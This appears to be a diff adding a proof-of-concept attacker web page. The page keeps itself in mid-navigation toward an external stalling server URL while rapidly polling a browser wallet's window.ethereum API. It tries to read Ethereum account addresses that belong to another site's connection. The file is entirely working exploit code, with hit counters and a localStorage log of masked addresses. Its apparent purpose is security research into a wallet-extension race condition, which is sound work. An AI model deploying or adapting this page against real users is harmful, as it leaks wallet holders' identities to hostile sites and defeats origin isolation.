@@ -1,0 +1,66 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>A2 (attacker page, counters)</title>
+</head>
+<body>
+<h1>PAGE A</h1>
+<p>This is page A. Clock (proves A is still alive): <b id="clk">-</b></p>
+<p id="cfg">-</p>
+<p><button id="go">Start</button> <a href="?view=1">View log</a></p>
+<p id="st">-</p>
+<p id="cnt">-</p>
+<pre id="log"></pre>
+<script>
+var q=new URLSearchParams(location.search);
+var V=q.get('v')||'https://syarif07.my.id/stall.php';
+var P=q.get('p')||'fbclid';
+var MODE=q.get('t')||'bar';
+var LOOP=parseInt(q.get('loop')||'0',10);
+var KEY='reissue-log';
+function now(){return new Date().toISOString().slice(11,23)}
+function log(s){var l=[];try{l=JSON.parse(localStorage.getItem(KEY)||'[]')}catch(e){}l.push(now()+' '+s);try{localStorage.setItem(KEY,JSON.stringify(l))}catch(e){}document.getElementById('st').textContent=s}
+function mask(a){return a.slice(0,2)+'..'+a.slice(-2)+' (len '+a.length+')'}
+setInterval(function(){document.getElementById('clk').textContent=now()},50);
+if(q.get('view')){
+  var l=localStorage.getItem(KEY)||'[]';
+  document.getElementById('log').textContent=JSON.parse(l).join('\n');
+  document.getElementById('cfg').innerHTML='<button onclick="localStorage.removeItem(KEY);location.reload()">Clear log</button>';
+} else {
+  document.getElementById('cfg').textContent='mode='+MODE+' target='+V+' param='+P+' loop='+LOOP+'ms';
+  document.getElementById('go').onclick=start;
+  if(q.get('auto')) setTimeout(start,1500);
+}
+function target(n){return V+(V.indexOf('?')<0?'?':'&')+P+'=1'+(n?'&n='+n:'')}
+var n=0, hits=0, calls=0, empty=0, errs=0;
+setInterval(function(){document.getElementById('cnt').textContent='calls '+calls+' | resolved [] '+empty+' | HIT '+hits+' | err '+errs+' | in-flight '+(calls-empty-hits-errs)},200);
+function poll(){
+  calls++;
+  window.ethereum.request({method:q.get('m')==='req'?'eth_requestAccounts':'eth_accounts'}).then(function(a){
+    if(!(a&&a.length))empty++;
+    if(a&&a.length){hits++; if(hits===1||hits%50===0) log('HIT#'+hits+' after '+calls+' calls: '+a.map(mask).join(', '))}
+  },function(e){errs++;if(errs%100===1) log('err '+e.code)});
+}
+function start(){
+  addEventListener('pagehide',function(){log('pagehide (A unloading), calls='+calls+' hits='+hits)});
+  log('START mode='+MODE+' target='+target(0)+' loop='+LOOP);
+  var go=function(){
+    location.href=target(0);
+    if(LOOP>0) setInterval(function(){n++;location.href=target(n)},LOOP);
+  };
+  if(MODE==='wallet'){
+    if(!window.ethereum){log('no window.ethereum');return}
+    window.ethereum.request({method:'eth_accounts'}).then(function(a){
+      log('BASELINE before navigation: '+(a.length?a.map(mask).join(', '):'[] (A not connected, good)'));
+      setInterval(poll,q.get('m')==='req'?50:5);
+      go();
+    });
+  } else {
+    go();
+  }
+}
+</script>
+</body>
+</html>
